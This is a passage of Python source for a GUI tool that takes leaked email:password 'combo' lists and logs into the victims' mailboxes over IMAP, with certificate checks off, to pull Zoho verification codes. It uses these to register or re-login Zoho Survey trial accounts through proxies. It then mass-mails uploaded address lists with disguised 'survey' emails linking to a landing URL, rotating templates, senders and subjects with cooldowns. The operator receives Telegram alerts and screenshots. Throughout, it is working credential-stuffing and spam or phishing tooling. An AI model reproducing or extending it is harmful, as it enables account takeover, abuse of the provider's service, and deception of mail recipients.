                CHECK_LOG.put(("err", "  Login failed for existing account  profile reset (try reconnecting with different combo)"))
                prof["status"] = "free"; prof["email"] = ""; prof["health"] = "ok"
                _save_profiles(profiles)
                if window: window.evaluate_js("refreshProfiles()")
                return
            # Reuse post-login flow
            cur = d.current_url
            if not cur.startswith("https://survey.zoho.com/"):
                d.get("https://survey.zoho.com/survey/newui")
                time.sleep(6)
                cur = d.current_url
            portal_id, dept_id = _extract_portal_dept(cur)
            if not portal_id:
                for _ in range(8):
                    time.sleep(2)
                    portal_id, dept_id = _extract_portal_dept(d.current_url)
                    if portal_id: break
            survey_id = _create_blank_survey(d, portal_id, dept_id) if portal_id else None
            prof.update({"status": "active", "connected_at": time.strftime("%Y-%m-%d %H:%M"),
                         "health": "ok", "zoho_password": login_zoho_pw or zoho_pw,
                         "imap_pw": password})
            if portal_id: prof["portal_id"] = portal_id
            if dept_id:   prof["dept_id"]   = dept_id
            if survey_id: prof["survey_id"] = survey_id
            _save_profiles(profiles)
            db_mark_registered(email, profile_idx=profile_idx)
            _mark_combo_connected(email, profile_idx, zoho_password=login_zoho_pw or zoho_pw)
            CHECK_LOG.put(("ok", f"  Profile {profile_idx} READY (existing acct) portal={portal_id} survey={survey_id}"))
            if window: window.evaluate_js("refreshProfiles()")
            return

        #  Wait for OTP or verification link 
        CHECK_LOG.put(("info", f"  Waiting for Zoho verification email in {email}..."))
        otp = _imap_get_otp(email, password, after_ts=reg_ts, timeout=120)
        if not otp:
            CHECK_LOG.put(("err", "  Verification not received within 120s"))
            try:
                snap = os.path.join(DIR, f"err_profile{profile_idx}_otp.png")
                d.save_screenshot(snap)
                _tg_send_with_switch_btn(tg_token, tg_chat,
                    f"[Priv8] OTP timeout (register)\nProfile {profile_idx}\nEmail: {email}"
                    f"\nTime: {time.strftime('%H:%M:%S')}", profile_idx)
                _tg_send_photo(tg_token, tg_chat, snap, f"OTP timeout  Profile {profile_idx}")
            except: pass
            prof["status"] = "free"; prof["email"] = ""; prof["health"] = "otp_timeout"
            _save_profiles(profiles)
            if window: window.evaluate_js("refreshProfiles()")
            return

        # Handle verification LINK (Zoho sends link for new accounts, OTP for login)
        if otp.startswith("http"):
            CHECK_LOG.put(("ok", f"  Verification link received  navigating..."))
            d.get(otp)
            time.sleep(6)
            CHECK_LOG.put(("info", f"  After link: {d.current_url[:80]}"))
            # Handle trust/continue prompt after link click
            for sel in [
                "//button[contains(translate(.,'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'continue')]",
                "//button[contains(translate(.,'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'proceed')]",
                "//button[contains(translate(.,'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'trust')]",
                "#nextbtn", "button[type='submit']",
            ]:
                by = By.XPATH if sel.startswith("//") else By.CSS_SELECTOR
                els = [e for e in d.find_elements(by, sel) if e.is_displayed()]
                if els: d.execute_script("arguments[0].click();", els[0]); time.sleep(3); break
            # Skip OTP entry block below  fall through to session check
        else:
            CHECK_LOG.put(("ok", f"  OTP: {otp}"))

            # Enter OTP  check for digit-box layout first (Zoho uses 7 individual boxes)
            _dboxes = d.find_elements(By.CSS_SELECTOR,
                "input.otp_input_box_otp, input.splitedText, input[class*='otp_input_box']")
            if _dboxes and len(_dboxes) >= 2:
                CHECK_LOG.put(("info", f"  Digit boxes: {len(_dboxes)}  ActionChains"))
                d.execute_script("arguments[0].click(); arguments[0].focus();", _dboxes[0])
                time.sleep(0.3)
                _ac2 = ActionChains(d)
                for _dg in otp:
                    _ac2.send_keys(_dg)
                    _ac2.pause(0.12)
                _ac2.perform()
                time.sleep(0.3)
                d.execute_script(f"""
                    var h=document.getElementById('otp_input_box_full_value');
                    if(h){{h.value='{otp}';h.dispatchEvent(new Event('change',{{bubbles:true}}));}}
                """)
            else:
                otp_el = None
                for sel in [
                    "input[autocomplete='one-time-code']", "input[placeholder*='OTP']",
                    "input[placeholder*='otp']", "input[name*='otp']", "input[id*='otp']",
                    "input[name='ztpc']", "input[maxlength='8']", "input[maxlength='7']",
                    "input[maxlength='6']", "input[type='tel']", "input[name='code']",
                ]:
                    els = [e for e in d.find_elements(By.CSS_SELECTOR, sel) if e.is_displayed()]
                    if els: otp_el = els[0]; break

                if otp_el:
                    d.execute_script("""
                        var el=arguments[0], code=arguments[1];
                        try{var s=Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype,'value').set;s.call(el,code);}catch(e){el.value=code;}
                        el.dispatchEvent(new Event('input',{bubbles:true}));
                        el.dispatchEvent(new Event('change',{bubbles:true}));
                    """, otp_el, otp)
                    try:
                        otp_el.send_keys(Keys.CONTROL + "a")
                        otp_el.send_keys(otp)
                    except: pass

            # Submit OTP form
            for sel in [
                "//button[contains(translate(.,'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'verify')]",
                "//button[contains(translate(.,'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'confirm')]",
                "//button[contains(translate(.,'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'proceed')]",
                "#nextbtn", "#reauth_button", "button[type='submit']",
            ]:
                by = By.XPATH if sel.startswith("//") else By.CSS_SELECTOR
                els = [e for e in d.find_elements(by, sel) if e.is_displayed()]
                if els: d.execute_script("arguments[0].click();", els[0]); break

            # Wait to leave accounts.zoho.com
            for _ in range(20):
                time.sleep(1)
                if "accounts.zoho.com" not in d.current_url: break

        # Handle trust/continue prompts
        time.sleep(3)
        for sel in [
            "//button[contains(translate(.,'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'trust')]",
            "//button[contains(translate(.,'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'yes')]",
            "//button[contains(translate(.,'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'continue')]",
            "//button[contains(translate(.,'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'proceed')]",
        ]:
            els = [e for e in d.find_elements(By.XPATH, sel) if e.is_displayed()]
            if els: d.execute_script("arguments[0].click();", els[0]); time.sleep(2); break

        #  Navigate to Survey dashboard 
        cur = d.current_url
        CHECK_LOG.put(("info", f"  Post-OTP URL: {cur[:80]}"))
        if "accounts.zoho.com" in cur or "survey.zoho.com" not in cur:
            d.get("https://survey.zoho.com/survey/newui")
            time.sleep(7)
            cur = d.current_url

        if not cur.startswith("https://survey.zoho.com/"):
            CHECK_LOG.put(("err", f"  Failed to reach survey dashboard (URL: {cur[:70]})"))
            try:
                snap = os.path.join(DIR, f"err_profile{profile_idx}_survey.png")
                d.save_screenshot(snap)
                _tg_send_photo(tg_token, tg_chat, snap, f"Survey nav failed  Profile {profile_idx}")
            except: pass
            prof["status"] = "free"; prof["email"] = ""; prof["health"] = "login_failed"
            _save_profiles(profiles)
            if window: window.evaluate_js("refreshProfiles()")
            return

        CHECK_LOG.put(("ok", "  Reached Zoho Survey dashboard!"))

        #  Extract portal/dept IDs 
        portal_id, dept_id = _extract_portal_dept(d.current_url)
        if not portal_id:
            for _ in range(10):
                time.sleep(2)
                portal_id, dept_id = _extract_portal_dept(d.current_url)
                if portal_id: break

        CHECK_LOG.put(("info", f"  portal_id={portal_id}  dept_id={dept_id}"))

        #  Create blank survey 
        survey_id = None
        if portal_id and dept_id:
            CHECK_LOG.put(("info", "  Creating blank survey..."))
            survey_id = _create_blank_survey(d, portal_id, dept_id)
            CHECK_LOG.put(("ok" if survey_id else "err",
                           f"  survey_id={survey_id}" if survey_id else "  Survey creation failed"))

        #  Mark profile as active 
        prof.update({
            "status":       "active",
            "connected_at": time.strftime("%Y-%m-%d %H:%M"),
            "health":       "ok",
            "zoho_password": zoho_pw,
            "imap_pw":      password,
        })
        if portal_id: prof["portal_id"] = portal_id
        if dept_id:   prof["dept_id"]   = dept_id
        if survey_id: prof["survey_id"] = survey_id
        _save_profiles(profiles)
        db_mark_registered(email, profile_idx=profile_idx)
        _mark_combo_connected(email, profile_idx, zoho_password=zoho_pw)
        CHECK_LOG.put(("ok",
            f"  Profile {profile_idx} READY  portal={portal_id}  dept={dept_id}  survey={survey_id}"))
        if window:
            try: window.evaluate_js("refreshProfiles()")
            except: pass

    except Exception as e:
        CHECK_LOG.put(("err", f"  Connect error: {e}"))
        try:
            if d:
                snap = os.path.join(DIR, f"err_profile{profile_idx}.png")
                d.save_screenshot(snap)
                _tg_send_with_switch_btn(tg_token, tg_chat,
                    f"[Priv8] Connect ERROR\nProfile {profile_idx}\nEmail: {email}"
                    f"\nError: {str(e)[:200]}\nTime: {time.strftime('%H:%M:%S')}", profile_idx)
                _tg_send_photo(tg_token, tg_chat, snap, f"Connect error  Profile {profile_idx}")
        except: pass
        prof["status"] = "free"; prof["email"] = ""; prof["health"] = "error"
        _save_profiles(profiles)
    finally:
        try:
            if d: d.quit()
        except: pass


def _mark_combo_connected(email, profile_idx, zoho_password=None):
    combos = _load_valid()
    for c in combos:
        if c["email"] == email:
            c["connected_profile"] = profile_idx
            if zoho_password:
                c["zoho_password"] = zoho_password
            break
    _save_valid(combos)


def _add_profile_thread(proxy):
    profiles = _load_profiles()
    idx = max(p["idx"] for p in profiles) + 1
    d   = os.path.join(PROF_BASE, f"profile_{idx}")
    os.makedirs(d, exist_ok=True)
    profiles.append({"idx": idx, "dir": d, "proxy": proxy.strip(),
                     "email": "", "status": "free", "connected_at": None,
                     "sent_count": 0, "health": "ok",
                     "trial_days": 7, "last_health_check": None})
    _save_profiles(profiles)
    CHECK_LOG.put(("ok", f"  Profile {idx} added (proxy: {proxy})"))
    if window:
        try: window.evaluate_js("refreshProfiles()")
        except: pass


# 
#  PROFILE HEALTH MONITOR
# 

def _calc_trial_remaining(connected_at_str, trial_days=7):
    """Returns days remaining and hours, or None if not available."""
    if not connected_at_str: return None, None
    try:
        from datetime import datetime
        connected = datetime.strptime(connected_at_str, "%Y-%m-%d %H:%M")
        elapsed = (datetime.now() - connected).total_seconds()
        remaining_secs = max(0, trial_days * 86400 - elapsed)
        days = int(remaining_secs // 86400)
        hours = int((remaining_secs % 86400) // 3600)
        return days, hours
    except: return None, None

def _health_monitor_thread(tg_token, tg_chat):
    """Check active profiles every 30 min; alert if trial expired or browser unreachable."""
    while True:
        time.sleep(1800)  # 30 minutes
        profiles = _load_profiles()
        changed = False
        for prof in profiles:
            if prof["status"] != "active": continue
            days, hours = _calc_trial_remaining(prof.get("connected_at"), prof.get("trial_days", 7))
            if days is not None:
                prof["last_health_check"] = time.strftime("%Y-%m-%d %H:%M")
                if days == 0 and hours == 0:
                    prof["health"] = "trial_expired"
                    changed = True
                    msg = (f"[Priv8] Trial EXPIRED\nProfile {prof['idx']}\n"
                           f"Email: {prof['email']}\nTime: {time.strftime('%H:%M:%S')}")
                    _tg_send_with_switch_btn(tg_token, tg_chat, msg, prof["idx"])
                elif days == 0 and hours <= 6:
                    msg = (f"[Priv8] Trial ending SOON\nProfile {prof['idx']}\n"
                           f"Email: {prof['email']}\nRemaining: {hours}h\nTime: {time.strftime('%H:%M:%S')}")
                    _tg_send(tg_token, tg_chat, msg)
        if changed:
            _save_profiles(profiles)
            if window:
                try: window.evaluate_js("refreshProfiles()")
                except: pass


# 
#  EMAIL SENDER (with template/sender/subject rotation)
# 

def _build_email_html(cfg, template=None):
    """Build email HTML; template overrides cfg body/title/subtitle."""
    b1  = cfg.get("banner1", "#0057b8")
    b2  = cfg.get("banner2", "#00a3e0")
    logo = cfg.get("logo_src", "")
    logo_h = (f'<img src="{logo}" style="max-height:48px;max-width:160px;'
              f'display:block;margin:0 auto 10px;object-fit:contain">' if logo else "")
    src = template or {}
    title       = src.get("title",    "We'd Love Your Feedback!")
    subtitle    = src.get("subtitle", "Your opinion shapes our future")
    body        = src.get("body",
        "We are conducting a <strong>short 3-minute survey</strong> to better "
        "understand your needs. Your feedback is extremely valuable to us. "
        "The survey is completely <strong>anonymous</strong>.")
    show_title  = src.get("show_title", False)
    show_icons  = src.get("show_icons", True)
    landing_url = cfg.get("landing_url", "").strip()
    footer_text = cfg.get("footer_text", "").strip()
    title_h = (f'<h1 style="color:#fff;font-size:22px;font-weight:700;margin:0 0 6px;font-family:Arial">'
               f'{title}</h1>') if show_title else ""
    inner = (f'{logo_h}{title_h}'
             f'<p style="color:rgba(255,255,255,.82);font-size:13px;margin:4px 0 0;font-family:Arial">'
             f'{subtitle}</p>')
    if landing_url:
        banner_td = (f'<td style="background:linear-gradient(135deg,{b1} 0%,{b2} 100%);'
                     f'padding:24px 26px 18px;text-align:center">'
                     f'<a href="{landing_url}" style="display:block;text-decoration:none">'
                     f'{inner}</a></td>')
    else:
        banner_td = (f'<td style="background:linear-gradient(135deg,{b1} 0%,{b2} 100%);'
                     f'padding:24px 26px 18px;text-align:center">{inner}</td>')
    if show_icons:
        icons = (f'<table width="100%" cellpadding="0" cellspacing="0" style="border-top:1px solid #eee;padding-top:14px"><tr>'
                 f'<td width="33%" style="text-align:center;padding:8px">'
                 f'<p style="font-size:22px;margin:0 0 4px">&#9201;</p>'
                 f'<p style="color:{b1};font-weight:700;font-size:12px;margin:0 0 1px;font-family:Arial">3 Minutes</p>'
                 f'<p style="color:#aaa;font-size:11px;margin:0;font-family:Arial">Quick &amp; Easy</p></td>'
                 f'<td width="33%" style="text-align:center;padding:8px">'
                 f'<p style="font-size:22px;margin:0 0 4px">&#128274;</p>'
                 f'<p style="color:{b1};font-weight:700;font-size:12px;margin:0 0 1px;font-family:Arial">Anonymous</p>'
                 f'<p style="color:#aaa;font-size:11px;margin:0;font-family:Arial">100% Private</p></td>'
                 f'<td width="33%" style="text-align:center;padding:8px">'
                 f'<p style="font-size:22px;margin:0 0 4px">&#127919;</p>'
                 f'<p style="color:{b1};font-weight:700;font-size:12px;margin:0 0 1px;font-family:Arial">Impactful</p>'
                 f'<p style="color:#aaa;font-size:11px;margin:0;font-family:Arial">Your Voice Matters</p></td>'
                 f'</tr></table>')
    else:
        icons = ""
    footer_extra = (f'<p style="color:#aaa;font-size:11px;margin:8px 0 0;font-family:Arial;text-align:center">'
                    f'{footer_text}</p>') if footer_text else ""
    return (f'<!-- BANNER -->\n'
            f'<table width="100%" cellpadding="0" cellspacing="0" style="margin:0;border-collapse:collapse">\n'
            f'<tr>{banner_td}</tr></table>\n'
            f'<!-- BODY -->\n'
            f'<table width="100%" cellpadding="0" cellspacing="0" style="margin:0;border-collapse:collapse">\n'
            f'<tr><td style="padding:20px 26px 16px;background:#fff">\n'
            f'<p style="color:#555;font-size:15px;line-height:1.7;margin:0 0 12px;font-family:Arial">Dear Participant,</p>\n'
            f'<p style="color:#555;font-size:15px;line-height:1.7;margin:0 0 16px;font-family:Arial">{body}</p>\n'
            f'{icons}{footer_extra}</td></tr></table>')




def _send_thread(cfg, emails, test_email, profile_dir, proxy=None, prof_idx=None, _managed=False):
    global _send_running
    if not _managed:
        _send_running = True
    d = None
    templates   = _load_templates()
    send_opts   = _load_send_options()
    sender_names = send_opts["sender_names"] or ["Research Team"]
    subjects     = send_opts["subjects"] or ["Quick Survey  Your Opinion Matters"]
    rotate_every = max(1, send_opts["rotate_every"])

    try:
        bs = max(1, int(cfg.get("batch_size", 100)))
        chunks = [emails[i:i+bs] for i in range(0, len(emails), bs)]
        cd_min = int(cfg.get("cd_min", 55))
        cd_max = int(cfg.get("cd_max", 75))

        SEND_LOG.put(("info", "  Opening browser..."))
        d = _build_driver(profile_dir, proxy=proxy, size=(1200, 900), headless=cfg.get("hidden_browser", False))
        d.get("https://survey.zoho.com/survey/newui"); time.sleep(7)
        DI.login_if_needed(d)
        SEND_LOG.put(("ok", f"  Logged in  |  {len(emails)} emails  {len(chunks)} batch(es) of {bs}"))
        # Apply survey end page setting once per session
        _ep_type = cfg.get("end_page_type", "default")
        if _ep_type and _ep_type != "default":
            SEND_LOG.put(("info", f"  Setting end page: {_ep_type}"))
            DI.set_survey_end_page(
                d, cfg["portal"], cfg["dept"], cfg["survey"],
                _ep_type, cfg.get("end_page_url", ""),
                cfg.get("end_page_msg", ""))

        for i, chunk in enumerate(chunks, 1):
            # Rotate every N batches
            if (i - 1) % rotate_every == 0:
                tpl  = random.choice(templates)
                from_name = random.choice(sender_names)
                subj      = random.choice(subjects)
                html = _build_email_html(cfg, tpl)
                SEND_LOG.put(("info", f"   Template rotate: [{subj}] / [{from_name}]"))

            SEND_LOG.put(("sep", f"   Batch {i}/{len(chunks)} ({len(chunk)}) "))
            ok = DI.configure_email_invite(
                d=d, portal_id=cfg["portal"], dept_id=cfg["dept"],
                survey_id=cfg["survey"], subject=subj,
                body_html=html, recipients=",".join(chunk),
                from_name=from_name,
                reply_to=cfg.get("reply_to", ""),
                send_mode=cfg.get("send_mode", "now"),
                schedule_dt=cfg.get("schedule_dt", ""))
            SEND_LOG.put(("ok" if ok else "err", f"  {'Sent' if ok else 'Failed'} batch {i}"))

            # Track sent count in profile
            if prof_idx and ok:
                try:
                    profs = _load_profiles()
                    for p in profs:
                        if p["idx"] == prof_idx:
                            p["sent_count"] = p.get("sent_count", 0) + len(chunk)
                            break
                    _save_profiles(profs)
                except: pass

            if i < len(chunks):
                w = random.randint(cd_min, cd_max)
                SEND_LOG.put(("dim", f"  Cooldown {w}s...")); time.sleep(w)

        if test_email.strip():
            time.sleep(random.randint(cd_min, cd_max))
            tpl = random.choice(templates)
            html_t = _build_email_html(cfg, tpl)
            SEND_LOG.put(("sep", f"   Test  {test_email.strip()} "))
            ok = DI.configure_email_invite(
                d=d, portal_id=cfg["portal"], dept_id=cfg["dept"],
                survey_id=cfg["survey"],
                subject=f"[TEST] {random.choice(subjects)}",
                body_html=html_t, recipients=test_email.strip(),
                from_name=random.choice(sender_names))
            SEND_LOG.put(("ok" if ok else "err", f"  Test: {'Sent' if ok else 'Failed'}"))

        if not _managed: SEND_LOG.put(("done", "  CAMPAIGN COMPLETE"))
        time.sleep(2)
    except Exception as e:
        import traceback
        SEND_LOG.put(("err", f"  CRASH: {e}"))
        SEND_LOG.put(("err", traceback.format_exc()[:400]))
    finally:
        if not _managed: _send_running = False
        try:
            if d: d.quit()
        except: pass
        if window and not _managed:
            try: window.evaluate_js("onSendDone()")
            except: pass


# 
#  JS API
# 

class API:
    #  COMBO CHECKER 

    def pick_combo_file(self):
        global window
        try:
            result = window.create_file_dialog(
                _OPEN_DLG, allow_multiple=False,
                file_types=('Text Files (*.txt;*.csv)', 'All files (*.*)')
            )
            if result and len(result) > 0:
                p = result[0]
                cnt = sum(1 for l in open(p, encoding="utf-8-sig", errors="ignore")
                          if ":" in l.strip())
                return {"path": p, "count": cnt}
        except Exception as e:
            CHECK_LOG.put(("err", f"  File dialog error: {e}"))
        return {"path": ""}

    def start_checking(self, payload):
        global _check_running, _all_combos, _check_checkpoint, _pool_monitor_on, MAX_VALID_POOL, POOL_RESUME_AT, _combo_file_path
        if _check_running: return {"error": "already_running"}
        path = payload.get("file","")
        if not path or not os.path.exists(path): return {"error": "file_not_found"}
        if payload.get("pool_limit"):
            MAX_VALID_POOL = int(payload["pool_limit"])
        if payload.get("resume_at"):
            POOL_RESUME_AT = int(payload["resume_at"])
        EMAIL_RE = re.compile(r'^[^@\s]+@[^@\s]+\.[^@\s]+$')
        combos = []
        for line in open(path, encoding="utf-8-sig", errors="ignore"):
            line = line.strip()
            if ":" not in line: continue
            email, pw = line.split(":", 1)
            if EMAIL_RE.match(email.strip()):
                combos.append((email.strip(), pw.strip()))
        if not combos: return {"error": "no_combos"}
        _all_combos = combos
        _combo_file_path = path
        _check_checkpoint = 0
        _clear_checkpoint()
        _check_running = True
        tg_token = payload.get("tg_token","")
        tg_chat  = payload.get("tg_chat","")
        threading.Thread(target=_combo_thread,
                         args=(combos, tg_token, tg_chat, 0), daemon=True).start()
        # Start pool monitor (only one instance)
        if not _pool_monitor_on:
            threading.Thread(target=_pool_monitor_thread,
                             args=(tg_token, tg_chat), daemon=True).start()
        return {"ok": True, "count": len(combos),
                "pool_limit": MAX_VALID_POOL, "resume_at": POOL_RESUME_AT}

    def stop_checking(self):
        global _check_running; _check_running = False; return {"ok": True}

    def resume_checking(self, payload):
        global _check_running, _pool_monitor_on, _all_combos, _check_checkpoint, _combo_file_path
        if _check_running: return {"error": "already_running"}
        # After restart: reload combos from checkpoint file
        if not _all_combos:
            ckpt = _load_checkpoint()
            if not ckpt: return {"error": "no_combo_list"}
            fpath = ckpt.get("file", "")
            if not fpath or not os.path.exists(fpath):
                return {"error": "combo_file_missing"}
            EMAIL_RE = re.compile(r'^[^@\s]+@[^@\s]+\.[^@\s]+$')
            combos = []
            for line in open(fpath, encoding="utf-8-sig", errors="ignore"):
                line = line.strip()
                if ":" not in line: continue
                email, pw = line.split(":", 1)
                if EMAIL_RE.match(email.strip()):
                    combos.append((email.strip(), pw.strip()))
            if not combos: return {"error": "no_combos"}
            _all_combos = combos
            _combo_file_path = fpath
            _check_checkpoint = ckpt.get("idx", 0)
        if _check_checkpoint >= len(_all_combos): return {"error": "already_done"}
        tg_token = payload.get("tg_token", "")
        tg_chat  = payload.get("tg_chat", "")
        _check_running = True
        threading.Thread(target=_combo_thread,
                         args=(_all_combos, tg_token, tg_chat, _check_checkpoint),
                         daemon=True).start()
        if not _pool_monitor_on:
            threading.Thread(target=_pool_monitor_thread,
                             args=(tg_token, tg_chat), daemon=True).start()
        return {"ok": True, "from": _check_checkpoint, "total": len(_all_combos)}

    def get_check_stats(self):
        s = dict(_CHECK_STATS)
        s["pool"] = _count_valid_not_connected()
        s["pool_limit"] = MAX_VALID_POOL
        s["resume_at"] = POOL_RESUME_AT
        s["checkpoint"] = _check_checkpoint
        s["combos_left"] = max(0, len(_all_combos) - _check_checkpoint)
        return s

    def get_startup_checkpoint(self):
        """Called on GUI load  returns checkpoint info if a previous session was interrupted."""
        ckpt = _load_checkpoint()
        if not ckpt:
            return {"found": False}
        fpath = ckpt.get("file", "")
        if not fpath or not os.path.exists(fpath):
            return {"found": False}
        return {
            "found": True,
            "file": os.path.basename(fpath),
            "idx": ckpt.get("idx", 0),
            "total": ckpt.get("total", 0),
            "saved_at": ckpt.get("saved_at", ""),
        }

    def poll_check_logs(self):
        msgs = []
        try:
            while True: msgs.append(CHECK_LOG.get_nowait())
        except queue.Empty: pass
        return msgs

    def get_valid_combos(self):
        return _load_valid()

    def clear_valid_combos(self):
        _save_valid([]); return {"ok": True}

    def get_db_stats(self):
        return {"count": db_count(), "list": db_get_all()[:50]}

    #  PROFILES 

    def get_profiles(self):
        profiles = _load_profiles()
        # Enrich with trial info
        for p in profiles:
            days, hours = _calc_trial_remaining(p.get("connected_at"), p.get("trial_days", 7))
            p["trial_days_left"]  = days
            p["trial_hours_left"] = hours
        return profiles

    def check_sessions_health(self):
        """Check each active profile's Zoho session  auto-relogin if expired."""
        profiles = _load_profiles()
        active = [p for p in profiles if p.get("status") == "active" and p.get("email")]
        if not active:
            return {"ok": True, "summary": "no_active_profiles", "results": []}
        results = []
        for prof in active:
            results.append({
                "idx": prof["idx"],
                "email": prof.get("email",""),
                "status": "checking"
            })
        CHECK_LOG.put(("info", f"Session health check: {len(active)} profile(s)"))
        def _health_worker(profs):
            # Build emailpassword lookup from valid_combos
            _pw_map = {}
            try:
                for v in _load_valid():
                    _pw_map[v["email"]] = v.get("password","")
            except: pass
            for prof in profs:
                idx  = prof["idx"]
                em   = prof.get("email","")
                pw_  = prof.get("imap_pw","") or _pw_map.get(em,"") or prof.get("password","")
                prx  = prof.get("proxy") or None
                d2   = None
                try:
                    d2 = _build_driver(prof["dir"], proxy=prx, headless=_hidden_browser)
                    d2.get("https://survey.zoho.com/survey/newui")
                    time.sleep(7)
                    cur = d2.current_url
                    if "survey.zoho.com" in cur and "accounts.zoho.com" not in cur and "login" not in cur:
                        CHECK_LOG.put(("ok", f"  Profile {idx} ({em[:25]}): session OK"))
                    elif ("relogin" in cur.lower() or "accounts.zoho.com" in cur
                          or ("login" in cur and "survey.zoho.com" not in cur)):
                        CHECK_LOG.put(("info", f"  Profile {idx} ({em[:25]}): session expired  re-login..."))
                        # Try relogin OTP first
                        relogin_ok = False
                        try:
                            # Record IMAP baseline
                            _imap_baseline = 0
                            try:
                                _ctx2 = ssl.create_default_context()
                                _ctx2.check_hostname = False; _ctx2.verify_mode = ssl.CERT_NONE
                                _dom2 = em.split("@")[1]
                                for _h2 in [f"imap.{_dom2}", f"mail.{_dom2}"]:
                                    try:
                                        _im2 = imaplib.IMAP4_SSL(_h2, 993, ssl_context=_ctx2)
                                        _im2.login(em, pw_)
                                        _im2.select("INBOX")
                                        _, _ms2 = _im2.search(None, 'FROM', '"zoho"')
                                        _ids2 = _ms2[0].split() if _ms2 and _ms2[0] else []
                                        _imap_baseline = int(_ids2[-1]) if _ids2 else 0
                                        _im2.logout()
                                        break
                                    except: pass
                            except: pass
                            # Click OTP
                            for sel in ["//span[@id='reloginwithotp']"]:
                                els = d2.find_elements(By.XPATH, sel)
                                if els:
                                    d2.execute_script("arguments[0].click();", els[0])
                                    break
                            time.sleep(5)
                            otp = _imap_get_otp(em, pw_, after_ts=time.time()-60, timeout=90)
                            if otp and not otp.startswith("http"):
                                boxes = d2.find_elements(By.CSS_SELECTOR, "input.otp_input_box_otp, input.splitedText")
                                if boxes:
                                    d2.execute_script("arguments[0].click(); arguments[0].focus();", boxes[0])
                                    _ac3 = ActionChains(d2)
                                    for _dg3 in otp: _ac3.send_keys(_dg3); _ac3.pause(0.12)
                                    _ac3.perform(); time.sleep(0.5)
                                for sel in ["#reauth_button", "button[type='submit']"]:
                                    els = [e for e in d2.find_elements(By.CSS_SELECTOR, sel) if e.is_displayed()]
                                    if els: d2.execute_script("arguments[0].click();", els[0]); break
                                time.sleep(8)
                                if "survey.zoho.com" in d2.current_url:
                                    relogin_ok = True
                        except Exception as _re3:
                            CHECK_LOG.put(("info", f"    Relogin err: {_re3}"))
                        # Fallback: full login
                        if not relogin_ok:
                            CHECK_LOG.put(("info", f"  Profile {idx}: trying full login flow..."))
                            lr = _login_existing_zoho(d2, em, pw_, time.time()-300)
                            relogin_ok = lr[0]
                        if relogin_ok:
                            CHECK_LOG.put(("ok", f"  Profile {idx} ({em[:25]}): re-login SUCCESS"))
                            profs2 = _load_profiles()
                            for p2 in profs2:
                                if p2["idx"] == idx:
                                    p2["last_health_check"] = time.strftime("%Y-%m-%d %H:%M")
                                    break
                            _save_profiles(profs2)
                        else:
                            CHECK_LOG.put(("err", f"  Profile {idx} ({em[:25]}): re-login FAILED"))
                    else:
                        CHECK_LOG.put(("info", f"  Profile {idx}: unexpected URL {cur[:60]}"))
                except Exception as _e3:
                    CHECK_LOG.put(("err", f"  Profile {idx} health check error: {_e3}"))
                finally:
                    if d2:
                        try: d2.quit()
                        except: pass
            CHECK_LOG.put(("sep", f"Health check done for {len(profs)} profile(s)"))
        threading.Thread(target=_health_worker, args=(active,), daemon=True).start()
        return {"ok": True, "checking": len(active), "results": results}

    def connect_profile(self, payload):
        email    = payload.get("email","")
        pw       = payload.get("password","")
        prof_idx = int(payload.get("profile_idx", 1))
        tg_token = payload.get("tg_token", "")
        tg_chat  = payload.get("tg_chat", "")
        if not email or not pw: return {"error": "missing_credentials"}
        profiles = _load_profiles()
        prof = next((p for p in profiles if p["idx"] == prof_idx), None)
        if not prof: return {"error": "profile_not_found"}
        if prof["status"] not in ("free","active"):
            return {"error": "profile_busy"}
        threading.Thread(target=_connect_thread,
                         args=(email, pw, prof_idx),
                         kwargs={"tg_token": tg_token, "tg_chat": tg_chat},
                         daemon=True).start()
        return {"ok": True}

    def add_profile(self, proxy):
        if not proxy or not proxy.strip():
            return {"error": "proxy_required"}
        threading.Thread(target=_add_profile_thread, args=(proxy,), daemon=True).start()
        return {"ok": True}

    def disconnect_profile(self, prof_idx):
        profiles = _load_profiles()
        for p in profiles:
            if p["idx"] == int(prof_idx):
                p["status"] = "free"; p["email"] = ""
                p["connected_at"] = None; p["health"] = "ok"
                break
        _save_profiles(profiles); return {"ok": True}

    def save_profile_proxy(self, payload):
        profiles = _load_profiles()
        for p in profiles:
            if p["idx"] == int(payload.get("idx",0)):
                p["proxy"] = payload.get("proxy","").strip(); break
        _save_profiles(profiles); return {"ok": True}

    def switch_profile_account(self, payload):
        """Switch profile to next available combo (can be called from UI)."""
        prof_idx = int(payload.get("profile_idx", 1))
        tg_token = payload.get("tg_token", "")
        tg_chat  = payload.get("tg_chat", "")
        _do_switch_profile(prof_idx, tg_token, tg_chat)
        return {"ok": True}

    #  EMAIL SENDER

    def send(self, payload):
        global _send_running
        if _send_running: return {"error": "already_running"}
        cfg        = payload.get("cfg", {})
        emails_raw = payload.get("emails","")
        file_path  = payload.get("file_path","")
        test_email = payload.get("test_email","")
        prof_idx   = payload.get("profile_idx", None)

        if file_path and os.path.exists(file_path):
            emails_raw = open(file_path, encoding="utf-8", errors="ignore").read()
        emails = [e.strip() for e in emails_raw.replace(",","\n").splitlines()
                  if e.strip() and "@" in e]
        if not emails: return {"error": "no_emails"}

        profile_dir = DI.PROF
        proxy = None
        if prof_idx is not None:
            profiles = _load_profiles()
            prof = next((p for p in profiles if p["idx"] == int(prof_idx)), None)
            if prof:
                profile_dir = prof["dir"]
                proxy = prof.get("proxy") or None

        threading.Thread(target=_send_thread,
                         args=(cfg, emails, test_email, profile_dir, proxy, prof_idx),
                         daemon=True).start()
        bs = max(1, int(cfg.get("batch_size",100)))
        return {"ok": True, "count": len(emails), "batches": -(-len(emails)//bs)}

